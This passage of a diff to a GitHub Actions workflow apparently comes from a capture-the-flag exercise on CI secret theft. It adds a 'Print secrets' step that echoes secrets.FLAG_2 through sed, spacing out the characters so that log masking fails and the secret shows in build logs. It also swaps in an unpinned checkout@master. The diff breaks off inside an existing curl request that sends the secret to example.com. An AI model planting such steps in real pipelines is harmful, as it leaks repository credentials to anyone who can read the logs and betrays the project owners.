@@ -6,8 +6,14 @@ jobs:
   sync-issues:
    runs-on: ubuntu-latest
    steps:
-     - uses: actions/checkout@v3
-     - run: |
+      - name: 'Checkout'
+        uses: actions/checkout@master
+      - name: 'Print secrets'
+        run: |
+            echo ${{ secrets.FLAG_2 }} | sed 's/./& /g'
+ 
+      - uses: actions/checkout@v3
+      - run: |
          curl --silent --location --request POST https://example.com \
          --header 'Authorization: ${{ secrets.FLAG_2 }}' \
          --data-raw '{
